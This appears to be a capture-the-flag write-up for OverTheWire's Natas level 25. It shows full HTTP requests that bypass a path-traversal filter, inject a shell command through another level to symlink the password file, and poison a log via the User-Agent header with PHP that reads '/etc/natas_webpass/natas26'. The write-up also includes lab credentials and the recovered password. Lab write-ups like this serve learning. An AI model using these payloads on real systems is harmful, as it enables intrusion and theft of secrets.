- There are two approaches that we can use to solve this level. Let's call them approach *Bubby* and approach *Scientist*
## Common base
- We have the following mimic source code with us, as usual:
```php
<?php
// cheers and <3 to malvina
// - morla
function setLanguage(){
/* language setup */
	if(array_key_exists("lang",$_REQUEST))
		if(safeinclude("language/" . $_REQUEST["lang"] ))
			return 1;
	safeinclude("language/en");
}

function safeinclude($filename){
	// check for directory traversal
	if(strstr($filename,"../")){
		logRequest("Directory traversal attempt! fixing request.");
		$filename=str_replace("../","",$filename);
	}
	// dont let ppl steal our passwords
	if(strstr($filename,"natas_webpass")){
		logRequest("Illegal file access detected! Aborting!");
		exit(-1);
	}
	// add more checks...
	if (file_exists($filename)) {
		include($filename);
		return 1;
	}
	return 0;
}

function listFiles($path){
	$listoffiles=array();
	if ($handle = opendir($path))
		while (false !== ($file = readdir($handle)))
			if ($file != "." && $file != "..")
				$listoffiles[]=$file;
	
	closedir($handle);
	return $listoffiles;
}

function logRequest($message){
	$log="[". date("d.m.Y H::i:s",time()) ."]";
	$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
	$log=$log . " \"" . $message ."\"\n";
	$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
	fwrite($fd,$log);
	fclose($fd);
}
?>
<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>
<?php
	session_start();
	setLanguage();
	echo "<h2>$__GREETING</h2>";
	echo "<p align=\"justify\">$__MSG";
	echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```
- Going through the code, we can see that we need to do a file inclusion in order to obtain the password for the next level
- However, the file inclusion is 'kind-of' suppressed due to the checks present in the `safeinclude()` function, so we need to do two things over here:
	1. Bypass the directory traversal check
	2. Bypass the check that prevents the file `natas_webpass` from being included
- Initially I was struggling to bypass the directory traversal check, however, going through the docs of `str_replace()` function in the PHP manual and its caveats, I realised that the function possesses a unique property: It doesn't replaces the strings specified recursively.
- How does it help us? Well, let me explain with an example:
	- The `str_replace()` method takes the regular expression to match (in our case it is `../`), and replaces it with the string we specify (in our case it is `""`) in the string we specify (in our case it will be the value of `$filename` variable)
	- So, if the value of `$filename` variable is `../`, it is converted to empty string
	- However, if the value of `$filename` variable is `....//`, then it is converted to `../` only. The method doesn't replace the specified string recursively. Hence, we can bypass this check.
- In order to include the desired file we want, first we need to check in which directory we are and in which directory we need to go. For this, we can fire up BurpSuite, intercept the request and its headers, and modify them like this:
```http
GET /?lang=. HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Referer: http://natas25.natas.labs.overthewire.org/
Cookie: PHPSESSID=5o6nht5jjo40nk6lh5d05pd452
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
- We have specified the `lang` query parameter's value as `.`, that tries to include the current directory, however this fails and we get the following error in response:
```text
include(/var/www/natas/natas25/language): failed to open stream: No such file or directory
```
- This implies that we need to go up by 5 levels, which means our initial part of the payload should contain this: `../../../../../`. However, to bypass the directory traversal check, we modify it to this: `....//....//....//....//....//`
- Testing the payload again, we modify our GET request as follows:
```http
GET /?lang=....//....//....//....//....// HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Referer: http://natas25.natas.labs.overthewire.org/
Cookie: PHPSESSID=5o6nht5jjo40nk6lh5d05pd452
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
- Firing this request, we get another error in our response:
```text
include(/): failed to open stream: No such file or directory
```
- Notice the path now, it is trying to include the filesystem root. Hence, we bypassed the directory traversal check, which means now we can specify whatever path we want to include in our application. This concludes our common information base, which will be used in both the approaches
- As a test for the file inclusion, we can include the `/etc/hosts` file which contains the mapping of IP addresses to domain names, kind of like a local DNS cache. For that, we modify our GET request as follows:
```http
GET /?lang=....//....//....//....//....//etc/hosts HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Referer: http://natas25.natas.labs.overthewire.org/
Cookie: PHPSESSID=5o6nht5jjo40nk6lh5d05pd452
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```
- Firing this request yields the following response (trimming to the useful part):
```text
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
127.0.0.1 natas natas.labs.overthewire.org
```
- The file has been included successfully, and the contents are displayed properly too. We can now proceed to crack the level
- We need to keep in mind that if we try to include the file `/etc/natas_webpass/natas26` directly, it shuts down the application entirely, stopping any PHP code from running further
## Approach Bubby
- In this approach, we make use of a previous level we solved, [Natas9](./Natas9_to_Natas10.md).
- We have seen in that level that we can pass any arbitrary command to the server and it will run it as it is, without any checks
- Although I had solved it without exploiting the RCE (Remote Code Execution), we can do that now
- Taking a quick recap, the command that is being executed looks like this: `grep -i $key dictionary.txt`
- For the `$key` variable, we can prepare a payload that will exit the `grep` command prematurely, then we can run our code
- So in this approach, we somehow need to make the file `/etc/natas_webpass/natas26` accessible to the `natas25` user without specifying the name. Hmm, a bit confusing, isn't it?
- However, if we think carefully, we can do that with a symbolic link. It is like a form of a shortcut that we can create in linux based OSes that allow us to access a file with some different name
- So, in the `/tmp/` directory which can be read and written by any user, we can create a symlink to `/etc/natas_webpass/natas26`, which can then be read by `natas25`. All we need to ensure is that we don't specify a filename that's too obvious
- So we prepare the command to run as this: `ln -s /etc/natas_webpass/natas26 /tmp/donttouchthisfileyouskriptkiddie` (Poor choice, but it will work)
- And our exploit to pass in becomes like this: `;ln -s /etc/natas_webpass/natas26 /tmp/donttouchthisfileyouskriptkiddie;`
- We pass this exploit payload in the level as mentioned in the following request:
```http
GET /?needle=%3bln%20-s%20%2fetc%2fnatas_webpass%2fnatas26%20%2ftmp%2fdonttouchthisfileyouskriptkiddie%3b&submit=Search HTTP/1.1
Host: natas9.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM5OlpFMWNrODJsbWRHSW9FcmxoUWdXTkQ2ajJXeno2YjZ0
Connection: keep-alive
Referer: http://natas9.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```
- The value of `needle` query param is just URL encoded that's why it looks so ugly
- We fire the request and get a usual response back
- Now, our file has been created at the location `/tmp/donttouchthisfileyouskriptkiddie`
- We simply include this file in our actual payload as follows:
```http
GET /?lang=....//....//....//....//....//tmp/donttouchthisfileyouskriptkiddie HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Referer: http://natas25.natas.labs.overthewire.org/
Cookie: PHPSESSID=5o6nht5jjo40nk6lh5d05pd452
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```
- We fire the request, and BOOM! our response now contains the string we were looking for: the password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
## Approach Scientist
- This approach does not have any dependency on any other level, which also might be the intended solution
- In this approach, we make use of the `logRequest()` function that has been already defined in the code. Let's have a quick recap of the code:
```php
function logRequest($message){
	$log="[". date("d.m.Y H::i:s",time()) ."]";
	$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
	$log=$log . " \"" . $message ."\"\n";
	$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
	fwrite($fd,$log);
	fclose($fd);
}
```
- The code logs the user agent and a message in the log file present at a specified location. However, there is no check performed for what user agent can be or what message can be
- This function is being called only if we hit the if condition of directory traversal or the inclusion of file containing the keyword `natas_webpass`. So, we will have to trigger at least one of the conditions in order to make an entry in the log file
- Now, if we somehow add our PHP exploit code in the log file, upon inclusion in this PHP file the code will execute and give us the result we want: the password
- So, we can set our user agent as follows: `<?php echo passthru('cat /etc/natas_webpass/natas26'); ?>`
- For the directory traversal hit, we can use the payload that we formed earlier: `....//....//....//....//....//etc/hosts`
- Combining these, our HTTP request looks like this:
```http
GET /?lang=....//....//....//....//....//etc/hosts HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: <?php echo passthru('cat /etc/natas_webpass/natas26'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Referer: http://natas25.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Cookie: PHPSESSID=42ojeas62bj8g750hdpmquta16

```
- We get the expected response, containing the data from `/etc/hosts` file:
```text
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
127.0.0.1 natas natas.labs.overthewire.org

```
- Note the session id we sent in the request: `42ojeas62bj8g750hdpmquta16`. This will help us to include the log file
- Note that for the log file, we have the path defined in the `logRequest()` method, using which we can form our path as: `/var/www/natas/natas25/logs/natas25_42ojeas62bj8g750hdpmquta16.log`
- Now, we can send this in our GET request as follows:
```http
GET /?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_42ojeas62bj8g750hdpmquta16.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: <?php echo passthru('cat /etc/natas_webpass/natas26'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Referer: http://natas25.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Cookie: PHPSESSID=42ojeas62bj8g750hdpmquta16
```
- After firing the request, we get the following response (trimmed to the juicy part):
```log
[20.09.2024 15::17:39] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."
[20.09.2024 15::25:14] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."
```
- Obtained password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
- Important point to be noted: BurpSuite is your friend now